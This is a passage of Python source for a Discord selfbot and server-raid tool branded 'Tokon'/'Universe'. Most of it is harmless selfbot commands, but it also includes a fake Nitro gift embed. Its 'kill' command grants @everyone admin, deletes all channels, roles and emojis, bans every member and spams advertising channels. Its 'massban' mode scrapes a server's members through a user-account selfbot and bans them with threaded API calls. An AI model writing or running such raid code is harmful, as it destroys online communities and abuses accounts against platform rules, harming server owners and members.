        async def clearblocked(ctx):
            await ctx.message.delete()
            print(Tokon.user.relationships)
            for relationship in Tokon.user.relationships:
                if relationship is discord.RelationshipType.blocked:
                    print(relationship)
                    await relationship.delete()

        @Tokon.command()
        async def regionchange(ctx, amount):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.GroupChannel):
                print()

        @Tokon.command()
        async def kickgc(ctx):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.GroupChannel):
                for recipient in ctx.message.channel.recipients:
                    await ctx.message.channel.remove_recipients(recipient)

        @Tokon.command()
        async def leavegc(ctx):
            await ctx.message.delete()
            if isinstance(ctx.message.channel, discord.GroupChannel):
                await ctx.message.channel.leave()

        @Tokon.command()
        async def massreact(ctx, emote):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                messages = await ctx.message.channel.history(limit=40).flatten()
                for message in messages:
                    await message.add_reaction(emote)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def linkvertise(ctx, link):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                headers = {
                    "Host": "bypass.bot.nu",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
                    "Accept": "*/*",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate, br",
                    "Referer": "https://bypass.bot.nu/",
                    "Connection": "keep-alive",
                }

                try:
                    data = requests.get(f"https://bypass.bot.nu/bypass2?url={link}", headers=headers)
                    link = data.json()["destination"]
                    print(Style.BRIGHT + f"[¤]{Fore.BLACK} Real Link :{Fore.GREEN} {link}{Fore.RESET}")
                except:
                    print(Style.BRIGHT + f"[{Fore.RED}#{Fore.RESET}]{Fore.BLACK} An unexpected error occurred")
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def readservers(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                for guild in Tokon.guilds:
                    await guild.ack()
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def nitroserver(ctx, serverlink):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                embed = discord.Embed(title="Nitro", description=f"[https://discord.gg/gift/gj2jKZcteT4uMZGm]({serverlink})")
                embed.set_image(url="https://cdn.discordapp.com/attachments/901245808517718077/926207025300525167/Discord-Nitro-e1618858537976.png")
                await ctx.send(embed=embed)
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def clearmenu(ctx):
            await ctx.message.delete()
            Universe.clear()
            startprint()

        @Tokon.command()
        async def close(ctx):
            await ctx.message.delete()
            Universe.restart()

        @Tokon.command()
        async def rainbow(ctx, *, role):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                role = discord.utils.get(ctx.guild.roles, name=role)
                while True:
                    try:
                        await role.edit(role=role, colour=RandomColor())
                        await asyncio.sleep(0.8)
                    except:
                        break
            else:
                await ctx.send('***Premium Invalid***')

        @Tokon.command()
        async def dog(ctx):
            await ctx.message.delete()
            r = requests.get("https://dog.ceo/api/breeds/image/random").json()
            link = str(r['message'])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def cat(ctx):
            await ctx.message.delete()
            r = requests.get("https://api.thecatapi.com/v1/images/search").json()
            link = str(r[0]["url"])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def sadcat(ctx):
            await ctx.message.delete()
            r = requests.get("https://api.alexflipnote.dev/sadcat").json()
            link = str(r['file'])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def bird(ctx):
            await ctx.message.delete()
            r = requests.get("https://api.alexflipnote.dev/birb").json()
            link = str(r['file'])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def fox(ctx):
            await ctx.message.delete()
            r = requests.get('https://randomfox.ca/floof/').json()
            link = str(r["image"])
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(link) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(file=discord.File(file, f"Tokon.png"))
            except:
                await ctx.send(link)

        @Tokon.command()
        async def feed(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/feed")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_feed.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def tickle(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/tickle")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_tickle.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def slap(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/slap")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_slap.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def hug(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/hug")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_hug.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def cuddle(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/cuddle")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_cuddle.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def smug(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/smug")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_smug.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def pat(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/pat")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_pat.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def kiss(ctx, user: discord.User):
            await ctx.message.delete()
            r = requests.get("https://nekos.life/api/v2/img/kiss")
            res = r.json()
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(res['url']) as resp:
                        image = await resp.read()
                with io.BytesIO(image) as file:
                    await ctx.send(user.mention, file=discord.File(file, f"Tokon_kiss.gif"))
            except:
                em = discord.Embed(description=user.mention)
                em.set_image(url=res['url'])
                await ctx.send(embed=em)

        @Tokon.command()
        async def purge(ctx, amount: int):
            await ctx.message.delete()
            async for message in ctx.message.channel.history(limit=amount).filter(
                    lambda m: m.author == Tokon.user).map(
                lambda m: m):
                try:
                    await message.delete()
                except:
                    pass

        @Tokon.command()
        async def reverse(ctx, *, message):
            await ctx.message.delete()
            message = message[::-1]
            await ctx.send(message)

        @Tokon.command()
        async def shrug(ctx):
            await ctx.message.delete()
            await ctx.send('/shrug')

        @Tokon.command()
        async def lenny(ctx):
            await ctx.message.delete()
            await ctx.send(Universe.banner.lenny)

        @Tokon.command()
        async def flip(ctx):
            await ctx.message.delete()
            await ctx.send('/tableflip')

        @Tokon.command()
        async def unflip(ctx):
            await ctx.message.delete()
            await ctx.send('/unflip')

        @Tokon.command()
        async def bold(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('**' + message + '**')

        @Tokon.command()
        async def spoil(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('||' + message + '||')

        @Tokon.command()
        async def underline(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('__' + message + '__')

        @Tokon.command()
        async def italicize(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('*' + message + '*')

        @Tokon.command()
        async def wave(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('~~' + message + '~~')

        @Tokon.command()
        async def greyembed(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('> ' + message)

        @Tokon.command()
        async def onelayer(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('`' + message + "`")

        @Tokon.command()
        async def twolayer(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('``' + message + "``")

        @Tokon.command()
        async def threelayer(ctx, *, message):
            await ctx.message.delete()
            await ctx.send('```' + message + "```")

        @Tokon.command()
        async def rolecolor(ctx, *, role: discord.Role):
            await ctx.message.delete()
            await ctx.send(f"{role.name} : {role.color}")

        @Tokon.command()
        async def empty(ctx):
            await ctx.message.delete()
            await ctx.send(chr(173))

        @Tokon.command()
        async def everyone(ctx):
            await ctx.message.delete()
            await ctx.send('https://@everyone@google.com')


        @Tokon.command()
        async def nitro(ctx):
            await ctx.message.delete()
            if idlog == premium_saveid and premium_status == "exact":
                await ctx.send(Nitro())
            else:
                await ctx.send('***Premium Invalid***')

        if __name__ == '__main__':
            Init()
        launch()
    if cmd == "raidbot":
        Universe.print.normal(True, 'kill')
        Universe.print.normal(True, 'massban')
        Universe.pause()
        launch()
    if cmd == "kill":
        killbot = discord.Client()
        killbot = commands.Bot(command_prefix=".")
        logoprincipal()
        Universe.print.normal(True, "                   Discord Commands = .stop, .kill, .admin")
        Universe.print.normal(True, "                   You Must Have a Token Bot Valid !")
        username73 = input(f"{Universe.print.input}Enter Your Full Discord Username : ")
        @killbot.command()
        @commands.is_owner()
        async def stop(ctx):
            await ctx.bot.logout()
            Universe.print.normal(True, f"{client.user.name} has logged out successfully." + Fore.RESET)
        @killbot.command()
        async def kill(ctx):
            await ctx.message.delete()
            guild = ctx.guild
            try:
                role = discord.utils.get(guild.roles, name="@everyone")
                await role.edit(permissions=discord.Permissions.all())
                Universe.print.normal(True, f"Everyone Is Admin")
            except:
                Universe.print.error(f"Everyone Is Not Admin")
            for channel in guild.channels:
                try:
                    await channel.delete()
                    Universe.print.normal(True, f"{channel.name} Is Deleted")
                except:
                    Universe.print.error(f"{channel.name} Is Not Deleted")
            for member in guild.members:
                try:
                    await member.ban()
                    Universe.print.normal(True, f"{member.name}#{member.discriminator} Is Banned")
                except:
                    Universe.print.error(f"{member.name}#{member.discriminator} Is Not Banned")
            for role in guild.roles:
                try:
                    await role.delete()
                    Universe.print.normal(True, f"{role.name} Is Deleted")
                except:
                    Universe.print.error(f"{role.name} Is Not Deleted")
            for emoji in list(ctx.guild.emojis):
                try:
                    await emoji.delete()
                    Universe.print.normal(True, f"{emoji.name} Is Deleted" + Fore.RESET)
                except:
                    Universe.print.error(f"{emoji.name} Is Not Deleted" + Fore.RESET)
            banned_users = await guild.bans()
            for ban_entry in banned_users:
                user = ban_entry.user
                try:
                    await user.unban(username73)
                    Universe.print.normal(True, f"{user.name}#{user.discriminator} Is Unbanned !" + Fore.RESET)
                except:
                    Universe.print.error(f"{user.name}#{user.discriminator} Is Not Unbanned !" + Fore.RESET)
            await guild.create_text_channel("Universe")
            for channel in guild.text_channels:
                link = await channel.create_invite(max_age=0, max_uses=0)
                Universe.print.normal(True, f"New Invite Of The Server : {link}")
            amount = 20
            for i in range(amount):
                await guild.create_text_channel(random.choice("tokon.site.xyz", "Killed"))
            Universe.print.normal(True, f"{guild.name} Killed !")
            return

        @killbot.command()
        async def admin(ctx):
            await ctx.message.delete()
            member = ctx.message.author
            role = await ctx.message.guild.create_role(name="Universe")
            roll = discord.utils.get(ctx.message.guild.roles, name="Universe")
            await roll.edit(permissions=discord.Permissions.all())
            await member.add_roles(role)

        @killbot.event
        async def on_guild_channel_create(channel):
            while True:
                await channel.send('Universe On Top ! **tokon.site.xyz/softwares**')

        bottoken = input(f"{Universe.print.input}Token Bot Valid : ")
        killbot.run(bottoken)
        launch()
    if cmd == "massban":
        token = Universe.crypt.decode("T")
        banlogs = token
        guildid = int(input(f'{Universe.print.input}Enter guild id: '))

        intents = discord.Intents.all()
        intents.members = True

        headers = {'Authorization': f'{banlogs}'}
        client = commands.Bot(command_prefix="l", case_insensitive=False, self_bot=True, intents=intents)
        client.remove_command("help")

        membercount = 0
        i = 0

        @client.event
        async def on_ready():
            await guild()

        async def menuban():
            guild = guildid
            txt = open('St/e1/massban/userscrape.txt')
            for member in txt:
                threading.Thread(target=massban, args=(guild, member,)).start()
            txt.close()
            time.sleep(4)

        def massban(guild, member):
            i = 0
            membercount = 0
            while True:
                r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
                if 'retry_after' in r.text:
                    time.sleep(r.json()['retry_after'])
                else:
                    if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                        while i < membercount:
                            i += 1
                            if i == 1:
                                print(" [¤] %dst user has been banned" % (i))
                            elif i == 2:
                                print(" [¤] %dnd user has been banned" % (i))
                            elif i == 3:
                                print(" [¤] %drd user has been banned" % (i))
                            else:
                                print(" [¤] %dth user has been banned" % (i))
                        break
                    else:
                        break

        async def main():
            if len(sys.argv) < 2:
                sys.stdout.write(f'''

            [¤] Connected as: {client.user} (USER)
            [¤] Guild: {guildid}

            ''')
            await menuban()
            await guild()

        async def guild():
            i = 0
            membercount = 0
            await client.wait_until_ready()
            ob = client.get_guild(guildid)
            members = await ob.chunk()
            os.remove("St/e1/massban/userscrape.txt")

            with open('St/e1/massban/userscrape.txt', 'a') as txt:
                for member in members:
                    txt.write(str(member.id) + "\n")
                    membercount += 1
                if membercount == 1:
                    print(f''' 
         [¤] Successfully scraped {membercount} member in total''')
                else:
                    print(f''' 
         [¤] Successfully scraped {membercount} members in total''')
                txt.close()
                time.sleep(1)
                await main()

        def check():
            try:
                client.run(banlogs, bot=False)
            except:
                Universe.print.normal(True, 'Invalid Token')
                time.sleep(2)
                launch()
        check()
    if not cmd == "menu":
        launch()

Universe.resolution('150','30')
launch()
